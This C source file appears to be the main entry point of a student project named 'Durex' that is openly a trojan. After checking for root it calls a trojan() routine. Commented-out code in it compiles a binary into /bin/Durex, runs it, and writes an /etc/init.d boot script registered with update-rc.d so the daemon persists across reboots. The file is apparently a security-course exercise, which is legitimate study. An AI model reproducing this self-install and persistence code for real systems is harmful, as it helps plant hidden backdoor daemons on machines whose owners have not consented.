/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: hivian <hivian@student.42.fr>              +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2017/06/01 12:15:37 by hivian            #+#    #+#             */
/*   Updated: 2017/06/09 14:59:00 by hivian           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "durex.h"

int		main()
{
	if (getuid() != 0) {
		printf("Permission denied. You need to be logged as root.\n");
		return (0);
	}

	/*char *code = "#include <stdio.h>%c#include <unistd.h>%cint main()%c{%cprintf(%cDAEMON\\n%c);%creturn (0);%c}%c";
	char *name = "durex.c";
	char *bin = "Durex";
	char bin_dest[5 + strlen(bin) + 1];

	printf("hivian\n");
	memset(bin_dest, 0, strlen(bin_dest));
	printf(code, 10, 10, 10, 10, 34, 34, 10, 10, 10);
	FILE *f = fopen(name, "w");
	fprintf(f, code, 10, 10, 10, 10, 34, 34, 10, 10, 10);
	fclose(f);
	sprintf(bin_dest, "/bin/%s", bin);
	printf("%s\n",bin_dest);

	pid_t pid_compil = fork();
	X(-1, pid_compil, "fork");
	if (pid_compil == 0) {
		X(-1, execlp("/usr/bin/gcc", "gcc", name, "-o", bin_dest, NULL), "execlp");
	} else {
		X(-1, wait(NULL), "wait");
	}

	pid_t pid_exec = fork();
	X(-1, pid_exec, "fork");
	if (pid_exec == 0) {
		X(-1, execlp("/bin/Durex", bin, NULL), "execlp");
	} else {
		X(-1, wait(NULL), "wait");
	}*/
	/*char *code = "#!/bin/bash%c%c### BEGIN INIT INFO%c"
	"# Provides:          Durex%c"
	"# Required-Start:    $remote_fs $syslog%c"
	"# Required-Stop:     $remote_fs $syslog%c"
	"# Should-Start:      $portmap%c"
	"# Should-Stop:       $portmap%c"
	"# X-Start-Before:    nis%c"
	"# X-Stop-After:      nis%c"
	"# Default-Start:     2 3 4 5%c"
	"# Default-Stop:      0 1 6%c"
	"# X-Interactive:     true%c"
	"# Short-Description: Daemon loader%c"
	"# Description:       load Durex%c"
	"### END INIT INFO%c%c"
	"/bin/Durex%c";
	char *name = "/etc/init.d/Durex";

	FILE *f = fopen(name, "w");
	fprintf(f, code, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10);
	fclose(f);

	pid_t pid_compil2 = fork();
	X(-1, pid_compil2, "fork");
	if (pid_compil2 == 0) {
		X(-1, execlp("/usr/sbin/update-rc.d", "update-rc.d", "Durex", "defaults", NULL), "execlp");
	} else {
		X(-1, wait(NULL), "wait");
	}*/
	t_env *e = (t_env*)malloc(sizeof(t_env));

	trojan(e);
	free(e);

	return (0);
}
